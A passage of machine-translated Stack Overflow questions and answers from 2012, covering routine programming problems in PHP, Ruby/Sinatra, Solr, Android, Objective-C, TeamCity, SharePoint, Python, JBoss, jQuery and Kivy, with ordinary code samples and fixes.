    $imagequery = mysql_query("SELECT source FROM photos ORDER BY id DESC LIMIT 16");
    $imageSrc = mysql_result($imagequery,$iii,'source');
    $thumb = PhpThumbFactory::create($imageSrc);  
    $thumb->resize(100,100);
     $thumb->show();  

?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T19:53:17.863

查看图像的源代码。你很可能在其中有一个 PHP 错误。可能来自 mySQL 查询，为此添加错误检查使用`mysql_error()`.

或者，在 PHPThumb 文件中查找发出`Content-type`标头的行并将其注释掉。然后你应该得到图像的源代码，以及任何 PHP 错误。

如果没有错误消息，另一个可能的原因是图像格式错误 - 大多数浏览器仅支持一组非常基本的图像格式（JPG、GIF、PNG）。Internet Explorer 不支持 CMYK 图像。

# ruby - 从 Sinatra 路由访问 EventMachine 通道

> ID：14074944
> 
> 赞同：3
> 
> 时间：2012-12-28T19:51:00.997
> 
> 标签：ruby, websocket, sinatra, eventmachine

我有一个在 EventMachine 上运行的简单 Sinatra 应用程序，例如[这个示例](https://stackoverflow.com/questions/2999430/any-success-with-sinatra-working-together-with-eventmachine-websockets)。

该应用程序正在运行，现在我想允许我在 Sinatra 中定义的路由使用创建的 EventMachine 通道访问 websocket。我天真地尝试了以下方法，但当然在 Sinatra 应用程序中，`@channel`变量没有定义，所以这不起作用。

```
require 'em-websocket'
require 'sinatra'

EventMachine.run do
  @channel = EM::Channel.new

  class App < Sinatra::Base
    get '/' do
      erb :index
    end

    post '/test' do
      @channel.push "Post request hit endpoint"
      status 200
    end
  end

  EventMachine::WebSocket.start :host => '0.0.0.0', :port => 8080 do |socket|
    socket.onopen do
      sid = @channel.subscribe { |msg| socket.send msg }
      @channel.push "Subscriber ID #{sid} connected!"

      socket.onmessage do |msg|
        @channel.push "Subscriber <#{sid}> sent message: #{msg}"
      end

      socket.onclose do
        @channel.unsubscribe(sid)
      end
    end
  end

  App.run! :port => 3000
end 
```

如何访问我在 Sinatra 应用程序中打开的 EventMachine 频道？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-30T10:42:33.320

如果其他人不知道我们在评论中谈论的是什么，这里有一个按照我建议的方式使用类实例变量的示例。这运行，但我不知道它是否符合预期：

```
require 'em-websocket'
require 'sinatra'
require 'haml'

module Example

  def self.em_channel
    @em_channel ||= EM::Channel.new
  end

  EventMachine.run do

    class App < Sinatra::Base
      configure do
        enable :inline_templates
      end

      get '/' do
        haml :index
      end

      get '/test' do
        Example.em_channel.push "Test request hit endpoint"
        status 200
      end
    end

    EventMachine::WebSocket.start :host => '0.0.0.0', :port => 8080 do |socket|
      socket.onopen do
        sid = Example.em_channel.subscribe { |msg| socket.send msg }
        Example.em_channel.push "Subscriber ID #{sid} connected!"

        socket.onmessage do |msg|
          Example.em_channel.push "Subscriber <#{sid}> sent message: #{msg}"
        end

        socket.onclose do
          Example.em_channel.unsubscribe(sid)
        end
      end
    end

    App.run!
  end
end

__END__

@@ layout
%html
  = yield

@@ index
%div.title Hello world. 
```

# solr - PathHierarchyTokenizerFactory 错误匹配相似路径

> ID：14074946
> 
> 赞同：0
> 
> 时间：2012-12-28T19:51:11.143
> 
> 标签：solr, lucene

我正在尝试使用 PathHierarchyTokenizerFactory 标记器的路径来创建构面，以允许用户在我的应用程序中过滤部门。这样做的原因是部门可以有孩子，这似乎是处理等级结构的最佳方式。

目前我正在使用以下 scheme.xml

```
<fieldType name="text_path" class="solr.TextField">
    <analyzer>
        <tokenizer class="solr.PathHierarchyTokenizerFactory" delimiter="|" />
    </analyzer>
</fieldType>

<field name="department_path" type="text_path" indexed="true" stored="true" multiValued="true"/> 
```

然而，这会导致匹配问题，在搜索“department_path:Ovens & Hobs|Gas Hobs”时给出一些示例，以下内容应匹配：

*   烤箱和炉灶|燃气灶
*   烤箱和炉灶|燃气灶|燃气灶(60cm)

以下不应该：

*   烤箱和滚刀
*   烤箱和滚刀|烤箱
*   台面
*   台面|滚刀防溅板

使用当前设置，我得到包含类似名称的结果，例如：

*   台面和防溅板|厨房防溅板|滚刀防溅板|滚刀防溅板钢|滚刀防溅板
*   烤箱和滚刀|电滚刀|电磁炉|电磁炉 60cm

如果有人知道我应该如何更改类型，那就太好了。

谢谢

编辑：

将我的 schema.xml 更改为

```
<fieldType name="descendent_path" class="solr.TextField">
    <analyzer type="index">
        <tokenizer class="solr.PathHierarchyTokenizerFactory" delimiter="\" />
    </analyzer>
    <analyzer type="query">
        <tokenizer class="solr.KeywordTokenizerFactory" />
    </analyzer>
</fieldType> 
```

它几乎可以正常工作，但是在搜索叶节点时，例如“烤箱和滚刀|燃气滚刀|燃气滚刀（60cm）”，我得到的结果不应该匹配。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-30T13:27:00.950

好的，所以对于将来阅读本文的任何人来说，我的代码都有两个问题。首先是我在索引和查询期间都在运行 PathHierarchyTokenizerFactory。为了我的需要，我只需要在索引期间运行这个标记器。结果类型是：

```
<fieldType name="descendent_path" class="solr.TextField">
    <analyzer type="index">
        <tokenizer class="solr.PathHierarchyTokenizerFactory" delimiter="|" />
    </analyzer>
    <analyzer type="query">
        <tokenizer class="solr.KeywordTokenizerFactory" />
    </analyzer>
</fieldType> 
```

另一个问题是我没有正确转义导致某些部门名称出现问题的输入。

# android - 使用两个 SimpleOnGestureListener

> ID：14074949
> 
> 赞同：1
> 
> 时间：2012-12-28T19:51:21.467
> 
> 标签：android

我想实现一个应用程序，其中两个计数器（或更多）随着上下滑动而递增和递减。因此我的想法是“主要活动”使用两个自定义视图（称为 CounterView.java）。该应用程序显示两个计数器，但交互不适用于 SimpleOnGestureListener。这是代码。活动主.xml：

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:id="@+id/RelativeLayout1"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:gravity="top"
    android:orientation="vertical"
    android:background="@color/opaque_black"
    tools:context=".MainActivity" >

<de.thomaslaemmlein.counter.CounterView
    android:id="@+id/counterView1"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignParentLeft="true"
    android:layout_alignParentTop="true" >
</de.thomaslaemmlein.counter.CounterView>

<de.thomaslaemmlein.counter.CounterView
    android:id="@+id/counterView2"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_marginLeft="10dp"
    android:layout_toRightOf="@id/counterView1" >
</de.thomaslaemmlein.counter.CounterView> 
```

MainActivity.java：

```
package de.thomaslaemmlein.counter;

import android.os.Bundle;
import android.app.Activity;
import android.util.Log;

public class MainActivity extends Activity {

    public MainActivity()
    {       
        Log.d("MainActivity", "Constructor");
    }

    protected void onDestroy() 
    {
        Log.d("MainActivity", "onDestroy");
        super.onDestroy();
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        Log.d("MainActivity", "onCreate");

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

} 
```

counter_view.xml：

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent" >

    <TextView
        android:id="@+id/counterTextView"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:background="@color/opaque_white"
        android:includeFontPadding="false"
        android:text="0"
        android:textAppearance="?android:attr/textAppearanceLarge"
        android:textSize="250sp" />

</RelativeLayout> 
```

CounterView.java：

```
package de.thomaslaemmlein.counter;

import android.content.Context;
import android.util.AttributeSet;
import android.util.Log;
import android.view.GestureDetector;
import android.view.GestureDetector.SimpleOnGestureListener;
import android.view.LayoutInflater;
import android.view.MotionEvent;
import android.view.View;
import android.widget.LinearLayout;
import android.widget.TextView;

public class CounterView extends LinearLayout {
    TextView m_CounterTextView;

    private int m_CurrentNumber;

    private int m_MaximalNumber = 99;

    public CounterView(Context context) {
        super(context);
        init();
    }

    public CounterView(Context context, AttributeSet attr) 
    {
        super(context, attr);
        init();
    }

    private void init()
    {
        Log.d("CounterView", "init");

        LayoutInflater inflater = LayoutInflater.from(getContext());
        View root = inflater.inflate(R.layout.counter_view, this, false);

        m_CurrentNumber = 0;

        m_CounterTextView = (TextView)root.findViewById(R.id.counterTextView);

        m_CounterTextView.setText( Integer.toString(m_CurrentNumber));

        addView(root);
    }

    @Override
     public boolean onTouchEvent(MotionEvent event) {
        return gestureDetector.onTouchEvent(event);
     }

    SimpleOnGestureListener simpleOnGestureListener
       = new SimpleOnGestureListener(){

      @Override
      public boolean onFling(MotionEvent e1, MotionEvent e2, float velocityX,
        float velocityY) {
       String swipe = "";
       float sensitvity = 50;

       // TODO Auto-generated method stub
       if((e1.getX() - e2.getX()) > sensitvity){
        swipe += "Swipe Left;";
       }else if((e2.getX() - e1.getX()) > sensitvity){
        swipe += "Swipe Right;";
       }else{
        swipe += ";";
       }

       if((e1.getY() - e2.getY()) > sensitvity){
        swipe += "Swipe Up;";
        if (m_CurrentNumber < m_MaximalNumber)
        {
            m_CurrentNumber++;
            m_CounterTextView.setText( Integer.toString(m_CurrentNumber));      
        }
       }else if((e2.getY() - e1.getY()) > sensitvity){
           if (m_CurrentNumber > 0)
           {
               m_CurrentNumber--;
               m_CounterTextView.setText( Integer.toString(m_CurrentNumber));
           }
        swipe += "Swipe Down;";
       }else{
        swipe += ";";
       }

       Log.d("onFling", swipe);

       return super.onFling(e1, e2, velocityX, velocityY);
      }
       };

       GestureDetector gestureDetector
       = new GestureDetector(simpleOnGestureListener);

} 
```

不会调用“onFling”方法。

在这种情况下有人帮助我吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T19:59:32.327

将**onTouchEvent**替换为，

```
@Override
public boolean onTouchEvent(MotionEvent event) {
 gestureDetector.onTouchEvent(event);

 return true; // This function must return true for onFling() to be called.
} 
```

# objective-c - Objective-c 是否遵循操作顺序（Bedmas）？

> ID：14074955
> 
> 赞同：3
> 
> 时间：2012-12-28T19:51:47.697
> 
> 标签：objective-c, excel, equation

我只是想知道，因为我构建的应用程序做了一个很长的方程式，结果与在 Excel 电子表格上完成时的结果不同，我得到了方程式。输入数字越高，差异越大。这是我在 xcode 中输入的方程式：
`360 * num1 * num3 * (1 - powf(14.9 / num1, 0.286))`
（num1 和 num3 是输入数字）。
这是 Excel 计算：
`=360*R9*R11*(1-((R10/R9)^0.286))`
(`R9`等于`num1`,`R11`等于`num3`,`R10`是 14.9)

我看不出方程式有什么不同，但如果有，请指出。我的问题是两者之一（可能是 ob-c 之一）正在做一些与我预期不同的事情。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-28T19:54:36.973

是的。Objective-C 是 C 的超集。

因此，C 具有的所有功能，Objective-C 也具有。

```
 360 * num1 * num3 * (1 - powf(14.9 / num1, 0.286)) (num1 and num3 are the input numbers)
          A * num3 * (1 - powf(14.9 / num1, 0.286)) 
                 B * (1 - powf(14.9 / num1, 0.286)) 
                 B * (1 - powf(C, 0.286)) 
                 B * (1 - D) 
                 B * (E) 
                      F 
```

仅供参考，BEDMAS 并未完全遵循。如果 D 和 M 处于同一级别，则最左边的将首先评估，A 和 S 的规则也是如此。但这看起来没什么大不了，但是当涉及到十进制数的截断和四舍五入时，它会创建一个大问题。

```
a * b / c is calculated  as "(a*b) / c" 
```

然而

```
a / b * c is calculated as "(a/b) * c" 
```

# continuous-integration - 如何删除 TeamCity（公共站点）的身份验证？

> ID：14074958
> 
> 赞同：1
> 
> 时间：2012-12-28T19:52:04.607
> 
> 标签：continuous-integration, teamcity

如何使我的 TeamCity 站点成为公共站点。当有人访问我的 TeamCity 站点时，我不希望登录页面成为登录页面，而只是列出所有项目的概述页面。

让每个人都从登录页面以访客身份登录似乎是一个毫无价值的步骤，我希望他们不必这样做。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T21:49:42.917

*目前*我能想到的唯一可行的方法是提供访客登录作为直接链接。例如，Castle Windsor 允许访客登录，您可以通过浏览直接进入：

> [http://builds.castleproject.org/guestLogin.html?guest=1](http://builds.castleproject.org/guestLogin.html?guest=1)

这与浏览不同

> [http://builds.castleproject.org/](http://builds.castleproject.org/)

这会将您带到登录页面。

# android - 在 Android 中使用 %System_Variables% 访问文件夹路径

> ID：14074959
> 
> 赞同：0
> 
> 时间：2012-12-28T19:52:14.353
> 
> 标签：android, variables, path, system

我正在努力解决以下问题。在配置文件中，我需要访问**外部**存储卡的一般路径。

这通常通过读取 %SDCARD% 系统变量来完成。

**但是**，我的手机制造商创建了内部存储器的两个分区，第二个分区挂载为“sdcard”。这将导致**%SDCARD%"**变量返回到**内部**存储器第二个分区的路径，而不是外部插入的 SD 卡。

SD 卡实际上是挂载的“sdcard-ext”。是否有系统变量返回此卷的通用路径以在通用路径中使用，例如

```
folder = "%SDCARD-EXT%/Subfolder1/Subfolder2" 
```

访问外部卡上的子文件夹 2？

预先感谢您的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T20:26:48.300

> 这通常通过读取 %SDCARD% 系统变量来完成。

Android不怎么用环境变量，Linux也不用`%`语法，上次查了一下。

> 这将导致 %SDCARD%" 变量返回到内部存储器第二个分区的路径，而不是外部插入的 SD 卡。

这是特定于该制造商的该设备的，无论该设备和制造商碰巧是什么。

> SD 卡实际上是挂载的“sdcard-ext”。

这是特定于该制造商的该设备的，无论该设备和制造商碰巧是什么。

> 是否有一个系统变量返回此卷的通用路径以在通用路径中使用

这是一个只有设备制造商才能回答的问题，因为 Android 没有`sdcard-ext`，并且环境变量（如果有的话）超出了 Android SDK 的范围。

# sharepoint-2010 - 允许用户写入共享点列表

> ID：14074960
> 
> 赞同：0
> 
> 时间：2012-12-28T19:52:16.130
> 
> 标签：sharepoint-2010

我正在 sharepoint 2010 中开发一个应用程序页面，在此页面中，用户可以获得可用培训课程的列表，并且有一个注册链接。

问题是普通用户无权访问出席登记的列表，所以如果我使用具有特权的用户运行应用程序，它可以工作，但是如果我尝试使用普通用户运行它，它会失败。

我能做些什么？

感谢您的任何建议..！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-29T08:24:50.593

您的代码块必须由以下代码运行：

```
SPSecurity.RunWithElevatedPrivileges(delegate() {
    // write to list code ...
    } 
```

# android - 扫描二维码，然后将解码后的数据和智能手机的位置发送到网络服务器

> ID：14074962
> 
> 赞同：0
> 
> 时间：2012-12-28T19:52:23.573
> 
> 标签：android

我的目标是用智能手机扫描二维码，解码数据，然后将数据和手机的当前位置发送到电子邮件地址或用于数据库存储的网站表单。

我找到了可以扫描、解码和发送电子邮件的应用程序……但不能检索位置信息……

任何指导表示赞赏。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T19:54:47.183

使用Android zxing库扫描二维码。我在多个项目中使用过，它非常有用。通过启用 GPS 可以轻松获取智能手机位置。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-28T19:55:02.560

您可以使用 ZXing 库扫描 QR 码并使用操作系统的位置 API 获取用户的位置。

# python - 使包装器显示为它在 help() 中包装的函数

> ID：14074964
> 
> 赞同：2
> 
> 时间：2012-12-28T19:52:25.547
> 
> 标签：python, wrapper, docstring, pydoc

不幸的是，我正在使用 python **2.4**（不是选择），所以 2.5 中添加的任何美妙的东西（例如 functools）都不能帮助我

我想包装一个函数，但是让它在你做 help(wrapper) 时看起来是它包装的函数

我通过做部分实现了这一点

```
def a():
    """a's docstring"""
    pass

def wrapper():
    a() 
wrapper.func_name = a.func_name #or should this use __name__ ?
wrapper.func_doc = a.func_doc #or should this use __doc__ ? 
```

现在`help(wrapper)`显示`a`函数名称和`a`文档字符串。除了感觉 hacky 之外，这不包括以下情况下的函数参数：

```
def b(x, y, z): 
    return a+b+c #or whatever

def wrapper(*args, **kwargs):
    #do something with the arguments
    return b(*args **kwargs) 
```

`help(wrapper)`导致这`b(*args, **kwargs)`显然不是我想要的。除非它嵌套在某个地方，否则似乎没有任何属性`dir(a)`可以帮助我。

* * *

编辑：如果您可以使用 pypi，请查看有助于解决此问题的装饰器模块。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-28T19:54:28.313

使用[`functools.wraps`](http://docs.python.org/2/library/functools.html#functools.wraps).

请注意，它*不会*伪造参数规范。您可能可以这样做（使用`inspect.getargspec`计算参数规范`foo`然后 hacking `bar`），但这不是传统的。

* * *

编辑：由于您使用的是 Python 2.4，因此您必须重新实现`functools.wraps`. 幸运的是，它实际上非常简单；它只是复制属性`__module__`,`__name__`和`__doc__`，然后`__dict__`用包装函数的`__dict__`. 所以你可以这样做：

```
WRAPPER_ASSIGNMENTS = ('__module__', '__name__', '__doc__')
WRAPPER_UPDATES = ('__dict__',)

def update_wrapper(wrapper,
                   wrapped,
                   assigned = WRAPPER_ASSIGNMENTS,
                   updated = WRAPPER_UPDATES):
    for attr in assigned:
        setattr(wrapper, attr, getattr(wrapped, attr))
    for attr in updated:
        getattr(wrapper, attr).update(getattr(wrapped, attr, {}))
    # Return the wrapper so this can be used as a decorator via partial()
    return wrapper

def wraps(wrapped,
          assigned = WRAPPER_ASSIGNMENTS,
          updated = WRAPPER_UPDATES):
    return partial(update_wrapper, wrapped=wrapped,
                   assigned=assigned, updated=updated) 
```

（仅供参考，这是实际的源代码`functools.wraps`。）

# java - 如何在 JBoss 7.1 中使用 JAX-RS 在 Web 服务中注入数据库管理器？

> ID：14074965
> 
> 赞同：0
> 
> 时间：2012-12-28T19:52:36.187
> 
> 标签：java, jboss, jboss7.x

我的`UserService`样子

```
@Path("/login")
public class UserService {

    @GET
    public Response getCustomer() {
    return Response.ok("hello world!").build();
    }
} 
```

并将此服务注册为

```
public class UserApplication extends Application {
    private Set<Object> emptySingletons = new HashSet<Object>();
    private Set<Class<?>> services = new HashSet<Class<?>>();

    public UserApplication() {
        services.add(new UserService().getClass());
    }

    public Set<Class<?>> getClasses() {
        return services;
    }

    public Set<Object> getSingletons() {
        return emptySingletons;
    }
} 
```

当我部署此服务并对其进行测试时，一切都很好

```
$ curl http://localhost:8080/jboss-as-helloworld/login
hello world! 
```

现在我有一个`Manager`查询该数据库并获得结果的查询，所以我将我的服务修改为

```
@GET
public Response getCustomer() {
    LoginManager loginManager = new LoginManager();
    Login user = loginManager.getUser("bird");
    if (user == null) {
        throw new WebApplicationException(Response.Status.NOT_FOUND);
    }
    return Response.ok("hello world!").build();
} 
```

当我部署此更改时，我看到错误为

```
11:50:23,678 ERROR [org.apache.catalina.core.ContainerBase.[jboss.web].[default-host].[/jboss-as-helloworld].[login]] (http--127.0.0.1-8080-5) Servlet.service() for servlet login threw exception: org.jboss.resteasy.spi.UnhandledException: java.lang.NullPointerException
    at org.jboss.resteasy.core.SynchronousDispatcher.handleApplicationException(SynchronousDispatcher.java:340) [resteasy-jaxrs-2.3.2.Final.jar:]
    at org.jboss.resteasy.core.SynchronousDispatcher.handleException(SynchronousDispatcher.java:214) [resteasy-jaxrs-2.3.2.Final.jar:]
    at org.jboss.resteasy.core.SynchronousDispatcher.handleInvokerException(SynchronousDispatcher.java:190) [resteasy-jaxrs-2.3.2.Final.jar:]
    at org.jboss.resteasy.core.SynchronousDispatcher.getResponse(SynchronousDispatcher.java:540) [resteasy-jaxrs-2.3.2.Final.jar:]
    at org.jboss.resteasy.core.SynchronousDispatcher.invoke(SynchronousDispatcher.java:502) [resteasy-jaxrs-2.3.2.Final.jar:]
    at org.jboss.resteasy.core.SynchronousDispatcher.invoke(SynchronousDispatcher.java:119) [resteasy-jaxrs-2.3.2.Final.jar:]
    at org.jboss.resteasy.plugins.server.servlet.ServletContainerDispatcher.service(ServletContainerDispatcher.java:208) [resteasy-jaxrs-2.3.2.Final.jar:]
    at org.jboss.resteasy.plugins.server.servlet.HttpServletDispatcher.service(HttpServletDispatcher.java:55) [resteasy-jaxrs-2.3.2.Final.jar:]
    at org.jboss.resteasy.plugins.server.servlet.HttpServletDispatcher.service(HttpServletDispatcher.java:50) [resteasy-jaxrs-2.3.2.Final.jar:]
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:847) [jboss-servlet-api_3.0_spec-1.0.0.Final.jar:1.0.0.Final]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:329) [jbossweb-7.0.13.Final.jar:]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:248) [jbossweb-7.0.13.Final.jar:]
    at org.jboss.weld.servlet.ConversationPropagationFilter.doFilter(ConversationPropagationFilter.java:62) [weld-core-1.1.5.AS71.Final.jar:2012-02-10 15:31]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:280) [jbossweb-7.0.13.Final.jar:]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:248) [jbossweb-7.0.13.Final.jar:]
    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:275) [jbossweb-7.0.13.Final.jar:]
    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:161) [jbossweb-7.0.13.Final.jar:]
    at org.jboss.as.web.security.SecurityContextAssociationValve.invoke(SecurityContextAssociationValve.java:153) [jboss-as-web-7.1.1.Final.jar:7.1.1.Final]
    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:155) [jbossweb-7.0.13.Final.jar:]
    at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:102) [jbossweb-7.0.13.Final.jar:]
    at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:109) [jbossweb-7.0.13.Final.jar:]
    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:368) [jbossweb-7.0.13.Final.jar:]
    at org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:877) [jbossweb-7.0.13.Final.jar:]
    at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:671) [jbossweb-7.0.13.Final.jar:]
    at org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:930) [jbossweb-7.0.13.Final.jar:]
    at java.lang.Thread.run(Thread.java:680) [classes.jar:1.6.0_29]
Caused by: java.lang.NullPointerException
    at com.mysema.query.jpa.impl.AbstractJPAQuery.createQuery(AbstractJPAQuery.java:134) [querydsl-jpa-2.9.0.jar:]
    at com.mysema.query.jpa.impl.AbstractJPAQuery.uniqueResult(AbstractJPAQuery.java:321) [querydsl-jpa-2.9.0.jar:]
    at com.mysema.query.jpa.impl.AbstractJPAQuery.uniqueResult(AbstractJPAQuery.java:308) [querydsl-jpa-2.9.0.jar:]
    at com.bb.service.LoginService.getLoginUser(LoginService.java:13) [classes:]
    at com.bb.business.LoginManager.getUser(LoginManager.java:13) [classes:]
    at com.bb.services.UserService.getCustomer(UserService.java:20) [classes:]
    at com.bb.services.UserService$Proxy$_$$_WeldClientProxy.getCustomer(UserService$Proxy$_$$_WeldClientProxy.java) [classes:]
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) [classes.jar:1.6.0_29]
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) [classes.jar:1.6.0_29]
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) [classes.jar:1.6.0_29]
    at java.lang.reflect.Method.invoke(Method.java:597) [classes.jar:1.6.0_29]
    at org.jboss.resteasy.core.MethodInjectorImpl.invoke(MethodInjectorImpl.java:155) [resteasy-jaxrs-2.3.2.Final.jar:]
    at org.jboss.resteasy.core.ResourceMethod.invokeOnTarget(ResourceMethod.java:257) [resteasy-jaxrs-2.3.2.Final.jar:]
    at org.jboss.resteasy.core.ResourceMethod.invoke(ResourceMethod.java:222) [resteasy-jaxrs-2.3.2.Final.jar:]
    at org.jboss.resteasy.core.ResourceMethod.invoke(ResourceMethod.java:211) [resteasy-jaxrs-2.3.2.Final.jar:]
    at org.jboss.resteasy.core.SynchronousDispatcher.getResponse(SynchronousDispatcher.java:525) [resteasy-jaxrs-2.3.2.Final.jar:]
    ... 22 more 
```

我确定我没有正确注入 Manager，但我该如何纠正呢？这是我第一次使用 JBoss。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T18:11:59.953

您根本没有注入数据库管理器。您正在使用标准 Java 运算符对其进行实例化`new`，这意味着您的 bean 不由 CDI 容器管理，因此它所依赖的任何对象都不会被初始化。这就是导致您的空指针异常的原因。您应该使用 @Inject 注释：

```
@Path("/login")
public class UserService {
    @Inject
    private LoginManager loginManager;

    @GET
    public Response getCustomer() {
        Login user = loginManager.getUser("bird");
        return Response.ok(user).build();
    }
} 
```

附带说明一下，您不需要在应用程序启动时注册您的用户服务，假设您`beans.xml`在其包含的存档（JAR 文件）中有一个有效的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T18:01:11.757

它应该类似于以下内容：

```
@Path("/login")
public class UserService {
    @In LoginManager loginManager;

    @GET
    public Response getCustomer() {
        ...
    }
} 
```

还要确保你有（至少是空的）WEB-INF/beans.xml

此处提供了一个最小的应用程序示例：[https ://github.com/jboss-developer/jboss-eap-quickstarts/tree/6.3.0.GA/helloworld-rs](https://github.com/jboss-developer/jboss-eap-quickstarts/tree/6.3.0.GA/helloworld-rs)

# jquery - 如何使 jQuery DataTable 只读？

> ID：14074967
> 
> 赞同：1
> 
> 时间：2012-12-28T19:52:56.097
> 
> 标签：jquery, jquery-ui, jquery-plugins

我有一个 jQuery 数据表，其设置如下。我在 document.ready 函数中使其可编辑。我正在尝试根据当前登录用户的角色控制添加/删除/更新功能。我可以通过为这两个按钮添加禁用属性来为添加/删除操作执行此操作。在 document.ready 函数中，我有一个 EnableUserAddDeleteButtons() 函数，它将检查用户的角色并通过删除“已禁用”属性（如果它是授权用户）来启用按钮。但是我不确定当用户未获得授权时如何将所有单元格设为只读。有任何想法吗？谢谢你的帮助。

```
<script type="text/javascript">

$(document).ready(function () {
    $('#UserDataTable').dataTable({
        "bJQueryUI": true,
        "sPaginationType": "full_numbers"
    }).makeEditable({
        "aoColumns": [{}, {}, {}, {},
        {
            type: 'select',
            onblur: 'submit',
            data: "{'True':'True', 'False':'False'}"
        },
        {
            type: 'select',
            onblur: 'submit',
            data: "{'True':'True', 'False':'False'}"
        },
        {
            type: 'select',
            onblur: 'submit',
            data: "{'True':'True', 'False':'False'}"
        }],

        sUpdateURL: "/Admin/UpdateUser"
        sAddURL: "/Admin/InsertUser"
        sDeleteURL: "/Admin/DeleteUser"

        sAddNewRowFormId: "formAddNewUser",
        sAddNewRowButtonId: "btnAddNewUser",
        sAddNewRowOkButtonId: "btnAdd",
        sAddNewRowCancelButtonId: "btnCancel",
        sDeleteRowButtonId: "btnDeleteUser",

        fnShowError: function (message, action) {
            switch (action) {
                case "update":
                    jAlert(message, "Update failed");
                    break;
                case "delete":
                    jAlert(message, "Delete failed");
                    break;
                case "add":
                    $("#lblAddError").html(message);
                    $("#lblAddError").show();
                    break;
            }
        },
        fnStartProcessingMode: function () {
            $("#processing_message").dialog();
        },
        fnEndProcessingMode: function () {
            $("#processing_message").dialog("close");
        }
    });

    EnableUserAddDeleteButtons();
});

</script> 
```

# python - 绑定在随机时间工作

> ID：14074979
> 
> 赞同：1
> 
> 时间：2012-12-28T19:54:05.060
> 
> 标签：python, kivy

我正在为 kivy 编写一个自定义小部件（请参阅[此](https://stackoverflow.com/questions/14073807/how-to-allow-infinite-integer-values-in-a-spinner)问题），但我刚刚发现，由于某种未知原因，有时该`bind`方法实际上并未绑定回调。

在我的课堂上，我有这个代码：

```
def __init__(self, **kwargs):
    super(SpinBox, self).__init__(**kwargs)

    self._value_label = Label(text=str(self.value))
    self.inc_button = TimedButton(text='+')
    self.dec_button = TimedButton(text='-')

    def inc(inst):
        if float(self.value) + float(self.step) <= self.max_value:
            self.value += self.step

    def dec(inst):
        if float(self.value) - float(self.step) >= self.min_value:
            self.value -= self.step

    self.inc_button.bind(on_press=inc)
    self.inc_button.bind(on_time_slice=inc)
    self.dec_button.bind(on_press=dec)
    self.dec_button.bind(on_time_slice=dec)
    # ... 
```

`TimedButton`其他自定义类在哪里。它是一个启动计时器的`Button`子类`on_touch_down`，如果在一定时间后它没有收到 a`on_touch_up`它认为按下是长按并开始每隔几毫秒发送一次`on_time_slice`事件。`Clock.schedule_interval`

因此，尝试像这样使用我的自定义类：

```
class MyApp(App):
    def build(self):
        return SpinBox()

MyApp().run() 
```

`value`根本不增加。

如果我做：

```
class MyApp(App):
    def build(self):
        s = SpinBox()
        def inc(inst):
            s.value += 1
        s.inc_button.bind(on_time_slice=inc)
        return s
MyApp().run() 
```

该值在每个事件*中*递增。`on_time_slice`我不明白为什么`MyApp`类中的绑定有效，而`SpinBox.__init__`方法中的绑定无效。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-20T11:49:15.803

我找到了解决办法。我没有绑定`on_touch_down`and`on_touch_up`我尝试绑定`state`实现`on_state`方法的属性`TimedButton`并且它可以工作。我仍然不明白为什么以前的实现在单独使用时起作用，但在 中不起作用`SpinBox`，除非直接在`App`类中绑定函数。

无论如何，由于看起来`TimedButton`类与它有关，这里是旧实现的代码：

```
class TimedButton(Button):
    """A simple ``Button`` subclass that produces an event at regular intervals
    when pressed.

    This class, when long-pressed, emits an ``on_time_slice`` event every
    ``time_slice`` milliseconds.

    :param long_press_interval: Defines the minimum time required to consider
                                the press a long-press.
    :type long_press_interval: int
    :param time_slice: The number of milliseconds of each slice.
    :type time_slice: int
    """

    def __init__(self, long_press_interval=550, time_slice=225, **kwargs):
        super(TimedButton, self).__init__(**kwargs)

        self.long_press_interval = long_press_interval
        self.time_slice = time_slice

        self._touch_start = None
        self._touch_uid = None
        self._long_press_callback = None
        self._slice_callback = None

